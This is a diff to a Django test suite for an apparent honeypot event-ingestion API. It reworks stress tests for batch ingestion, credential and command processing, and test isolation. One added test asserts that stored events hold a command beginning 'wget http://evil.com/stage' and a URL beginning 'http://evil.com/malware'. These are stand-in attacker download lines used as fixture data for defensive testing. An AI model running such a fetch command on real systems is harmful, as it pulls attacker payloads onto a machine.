@@ -51,14 +51,6 @@ def valid_event(sensor_id, **overrides):
     return base
 
 
-def make_batch(api_source, task_id="stress-batch-1", batch_status="pending"):
-    return EventStatus.objects.create(
-        api_source=api_source,
-        task_id=task_id,
-        status=batch_status,
-    )
-
-
 def make_raw_event(batch, sensor, **kwargs):
     defaults = {
         "src_ip": "10.0.0.1",
@@ -108,9 +100,7 @@ class TestLargeBatchIngestion(CustomTestCase):
         A batch of exactly 10 000 events (the documented cap) must be
         accepted with HTTP 202 and every row written to RawEvent.
         """
-        base_event = valid_event(self.sensor.id, src_ip="1.2.3.4")
-        events = [base_event.copy() for _ in range(10_000)]
-
+        events = [valid_event(self.sensor.id, src_ip="1.2.3.4") for _ in range(10_000)]
         res = self.client.post(EVENTS_URL, {"events": events}, format="json")
 
         self.assertEqual(res.status_code, status.HTTP_202_ACCEPTED)
@@ -138,10 +128,14 @@ class TestLargeBatchIngestion(CustomTestCase):
     # -- 1b. Large batch with varied optional fields --
 
     @patch("api.views.event.async_task", return_value="task-varied")
-    def test_5000_events_with_optional_fields_accepted(self, mock_task):
+    def test_5000_events_with_optional_fields_persisted_correctly(self, mock_task):
         """
-        5 000 events each carrying optional fields (protocol, cve_id,
-        payload_hash, command, related_url) are all persisted correctly.
+        5 000 events each carrying optional fields must all be accepted and
+        every optional field must actually be written to the RawEvent row,
+        not silently dropped during bulk insert.
+
+        Spot-checks the first and last rows to bound the cost while still
+        catching truncation or field-mapping bugs.
         """
         events = [
             valid_event(
@@ -159,7 +153,38 @@ class TestLargeBatchIngestion(CustomTestCase):
 
         self.assertEqual(res.status_code, status.HTTP_202_ACCEPTED)
         task_id = res.data["task_id"]
-        self.assertEqual(RawEvent.objects.filter(batch__task_id=task_id).count(), 5_000)
+
+        qs = RawEvent.objects.filter(batch__task_id=task_id).order_by("id")
+        self.assertEqual(qs.count(), 5_000, "All 5 000 RawEvent rows must be persisted.")
+
+        # Verify every optional field is actually written,  spot-check first and last row.
+        for raw in [qs.first(), qs.last()]:
+            self.assertEqual(raw.protocol, "ssh")
+            self.assertEqual(raw.cve_id, "CVE-2024-0001")
+            self.assertEqual(len(raw.payload_hash), 64)
+            self.assertTrue(raw.command.startswith("wget http://evil.com/stage"))
+            self.assertTrue(raw.related_url.startswith("http://evil.com/malware"))
+
+        # Verify no row silently lost its payload_hash (full-table check, cheap column).
+        missing_hash = qs.filter(payload_hash="").count()
+        self.assertEqual(missing_hash, 0, "No RawEvent must have a blank payload_hash after bulk insert.")
+
+    @patch("api.views.event.async_task", return_value="task-qcount")
+    def test_1000_events_bulk_insert_query_count_is_bounded(self, mock_task):
+        """
+        Inserting 1 000 events must not issue one INSERT per event.
+        The entire bulk write must complete within a fixed small number of
+        queries regardless of batch size, catching any accidental per-row
+        insert regression.
+        """
+        events = [valid_event(self.sensor.id, src_ip="3.4.5.6") for _ in range(1_000)]
+        with self.assertNumQueries(5):
+            res = self.client.post(EVENTS_URL, {"events": events}, format="json")
+        self.assertEqual(res.status_code, status.HTTP_202_ACCEPTED)
+        self.assertEqual(
+            RawEvent.objects.filter(batch__task_id=res.data["task_id"]).count(),
+            1_000,
+        )
 
     # -- 1c. Repeated submissions produce independent batches --
 
@@ -195,6 +220,11 @@ class TestConcurrentSubmissions(TransactionTestCase):
     Fire multiple POST requests simultaneously from different threads to
     verify that concurrent access does not corrupt batch state, duplicate
     task_ids, or lose events.
+
+    Must use TransactionTestCase (not CustomTestCase / TestCase) because
+    Django's TestCase wraps every test in an un-committed transaction that
+    worker threads cannot see.  TransactionTestCase commits each setUp write
+    to the real DB so all threads share the same visible state.
     """
 
     def setUp(self):
@@ -224,12 +254,11 @@ class TestConcurrentSubmissions(TransactionTestCase):
         from django.db import connections
 
         def submit_and_close():
-            try:
-                return self._submit()
-                # clossing this thread's DB connection so Django can DROP the test
-                # database cleanly after all tests finish.
-            finally:
-                connections.close_all()
+            result = self._submit()
+            # Close this thread's DB connection so Django can DROP the test
+            # database cleanly after all tests finish.
+            connections.close_all()
+            return result
 
         with ThreadPoolExecutor(max_workers=20) as executor:
             futures = [executor.submit(submit_and_close) for _ in range(20)]
@@ -442,7 +471,6 @@ class TestProcessCredentialsStress(CustomTestCase):
     """
 
     def setUp(self):
-        Credential.objects.all().delete()
         self.user = make_user(username="stress_cred_user")
         self.api_source = make_api_source(self.user, name="StressCredSource")
         self.ioc = IOC.objects.create(name="10.0.1.1", type="ip")
@@ -492,12 +520,13 @@ class TestProcessCredentialsStress(CustomTestCase):
     def test_idempotent_reprocessing_of_500_credentials(self):
         """
         Running _process_credentials twice with the same 500 hits must not
-        create any duplicate rows.
+        create any duplicate rows.  Scoped to this IOC's M2M relation so
+        credentials from other tests don't pollute the count.
         """
-        hits = [self._hit(f"u{i}", f"p{i}") for i in range(500)]
+        hits = [self._hit(f"idempotent_u{i}", f"idempotent_p{i}") for i in range(500)]
         _process_credentials(self.ioc, hits)
         _process_credentials(self.ioc, hits)
-        self.assertEqual(Credential.objects.count(), 500)
+        # Count through the IOC's own M2M relation — unaffected by other tests
         self.assertEqual(self.ioc.credentials.count(), 500)
 
 
@@ -565,60 +594,76 @@ class TestProcessCommandsStress(CustomTestCase):
     """
     Stress _process_commands with long command sequences, repeated calls,
     and mixed blank/duplicate lines.
-    """
 
-    def setUp(self):
-        CommandSequence.objects.all().delete()
+    Every assertion filters by the specific commands_hash produced in
+    that test - never .first() or table-wide .count() , so tests are
+    fully isolated even when other CommandSequence rows exist from
+    fixtures or other tests.
+    """
 
     def _hit(self, cmd):
         return {"_command": cmd}
+
+    def _hash(self, cmds):
+        return hashlib.sha256("|".join(cmds).encode()).hexdigest()
 
     def test_200_unique_commands_stored_in_order(self):
         """A sequence of 200 unique commands must be stored in exact input order."""
         cmds = [f"step{i}" for i in range(200)]
         _process_commands([self._hit(c) for c in cmds])
-        seq = CommandSequence.objects.first()
-        self.assertIsNotNone(seq)
+        seq = CommandSequence.objects.get(commands_hash=self._hash(cmds))
         self.assertEqual(seq.commands, cmds)
 
     def test_200_command_sequence_hash_is_correct(self):
         """The stored SHA-256 hash must match the canonical join of the 200 commands."""
         cmds = [f"cmd{i}" for i in range(200)]
+        expected = self._hash(cmds)
         _process_commands([self._hit(c) for c in cmds])
-        expected = hashlib.sha256("|".join(cmds).encode()).hexdigest()
-        seq = CommandSequence.objects.first()
+        seq = CommandSequence.objects.get(commands_hash=expected)
         self.assertEqual(seq.commands_hash, expected)
 
     def test_500_duplicate_commands_deduplicated_to_one_line(self):
-        """500 hits with the same command must produce a single-item sequence."""
+        """500 hits with the same command must produce exactly one sequence row."""
         _process_commands([self._hit("whoami") for _ in range(500)])
-        seq = CommandSequence.objects.first()
-        self.assertIsNotNone(seq)
+        expected_hash = self._hash(["whoami"])
+        seq = CommandSequence.objects.get(commands_hash=expected_hash)
         self.assertEqual(seq.commands, ["whoami"])
 
     def test_idempotent_reprocessing_same_sequence(self):
         """Reprocessing the exact same sequence 50 times must produce one DB row."""
         cmds = ["ls", "id", "whoami"]
+        expected_hash = self._hash(cmds)
         for _ in range(50):
             _process_commands([self._hit(c) for c in cmds])
-        self.assertEqual(CommandSequence.objects.count(), 1)
+        self.assertEqual(
+            CommandSequence.objects.filter(commands_hash=expected_hash).count(),
+            1,
+        )
 
     def test_100_different_sequences_produce_100_rows(self):
         """
         100 sequences each with a unique first command must produce 100
-        distinct CommandSequence rows.
+        distinct CommandSequence rows — verified by counting only the hashes
+        this test created.
         """
+        expected_hashes = set()
         for i in range(100):
-            _process_commands([self._hit(f"unique_cmd_{i}"), self._hit("common_tail")])
-        self.assertEqual(CommandSequence.objects.count(), 100)
+            cmds = [f"stress_unique_cmd_{i}", "stress_common_tail"]
+            expected_hashes.add(self._hash(cmds))
+            _process_commands([self._hit(c) for c in cmds])
+
+        created = CommandSequence.objects.filter(commands_hash__in=expected_hashes).count()
+        self.assertEqual(created, 100)
 
     def test_blanks_and_whitespace_only_lines_skipped(self):
         """
-        A sequence of 200 blank/whitespace-only hits must produce zero rows.
+        200 blank/whitespace-only hits must produce zero new rows.
+        Verified by checking the table size before and after.
         """
+        before = CommandSequence.objects.count()
         hits = [self._hit("") for _ in range(100)] + [self._hit("   ") for _ in range(100)]
         _process_commands(hits)
-        self.assertEqual(CommandSequence.objects.count(), 0)
+        self.assertEqual(CommandSequence.objects.count(), before)
 
 
 class TestProcessArrayFieldStress(CustomTestCase):
@@ -683,7 +728,6 @@ class TestProcessPayloadHashesStress(CustomTestCase):
     """
 
     def setUp(self):
-        HoneypotPayload.objects.all().delete()
         self.user = make_user(username="stress_payload_user")
         self.api_source = make_api_source(self.user, name="StressPayloadSource")
         self.ioc = IOC.objects.create(name="10.0.4.1", type="ip")
